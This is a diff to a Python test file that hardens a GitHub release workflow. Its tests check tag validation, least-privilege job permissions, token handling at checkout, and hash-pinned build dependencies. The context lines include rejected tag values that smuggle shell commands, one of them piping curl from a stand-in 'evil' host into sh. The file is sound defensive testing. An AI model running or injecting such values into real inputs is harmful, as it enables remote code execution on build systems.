@@ -330,3 +330,64 @@ def test_the_tag_guard_rejects_a_newline_as_well_as_a_bad_shape(tmp_path):
                 '"; curl -s https://evil/x | sh; #', "v1.3.1;id", "v1.3.1$(id)",
                 "v1.3.1 --clobber"):
         assert _run(bad).returncode != 0, f"accepted {bad!r}"
+
+
+# --- rules 3-5: no third-party code beside the write token ---------------------
+
+def _jobs(text):
+    """``{job_name: job_text}`` for a workflow, textually (no PyYAML in CI)."""
+    import re
+    body = text[text.index("\njobs:\n") + len("\njobs:\n"):]
+    heads = list(re.finditer(r"^  ([A-Za-z0-9_-]+):\s*$", body, re.M))
+    return {m.group(1): body[m.start():heads[i + 1].start() if i + 1 < len(heads) else len(body)]
+            for i, m in enumerate(heads)}
+
+
+def test_the_job_finder_finds_both_release_jobs():
+    jobs = _jobs((REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8"))
+    assert set(jobs) == {"windows", "publish"}
+
+
+def test_only_a_job_that_runs_no_third_party_code_can_write():
+    """The build job installs PyInstaller and pytest from PyPI and executes
+    them. It used to hold contents:write; a compromised build dependency could
+    then have published a release or pushed to the repository."""
+    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
+    top = wf[:wf.index("\njobs:\n")]
+    assert "contents: write" not in top, "write must not be the workflow default"
+    for name, job in _jobs(wf).items():
+        code = "\n".join(ln for ln in job.splitlines() if not ln.strip().startswith("#"))
+        if "contents: write" in code:
+            for forbidden in ("pip ", "pytest", "PyInstaller", "python "):
+                assert forbidden not in code, f"job {name!r} can write and runs {forbidden.strip()}"
+        else:
+            assert "contents: read" in code, f"job {name!r} does not declare read-only"
+
+
+def test_checkout_never_leaves_the_token_in_git_config():
+    for wf in WORKFLOWS:
+        lines = wf.read_text(encoding="utf-8").splitlines()
+        for i, line in enumerate(lines):
+            if "uses: actions/checkout@" in line:
+                block = "\n".join(lines[i + 1:i + 6])
+                assert "persist-credentials: false" in block, f"{wf.name}:{i + 1}"
+
+
+def test_release_build_tooling_is_installed_by_hash():
+    wf = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
+    installs = [b for _ln, b in _run_blocks(wf) if "pip install" in b]
+    assert installs, "the release job installs nothing?"
+    for body in installs:
+        assert "--require-hashes" in body and "-r packaging/requirements-build.txt" in body, body
+        assert "--only-binary=:all:" in body, "an sdist build would run unpinned build backends"
+
+
+def test_every_build_requirement_is_pinned_and_hashed():
+    import re
+    text = (REPO / "packaging" / "requirements-build.txt").read_text(encoding="utf-8")
+    logical = re.sub(r"\\\n\s*", " ", text)     # join "\"-continued lines
+    reqs = [ln for ln in logical.splitlines() if ln.strip() and not ln.lstrip().startswith("#")]
+    assert {r.split("==")[0] for r in reqs} >= {"pyinstaller", "pytest"}
+    for r in reqs:
+        assert re.match(r"^[A-Za-z0-9_.-]+==[^\s]+ ", r), f"not pinned exactly: {r}"
+        assert re.search(r"--hash=sha256:[0-9a-f]{64}", r), f"no hash: {r}"
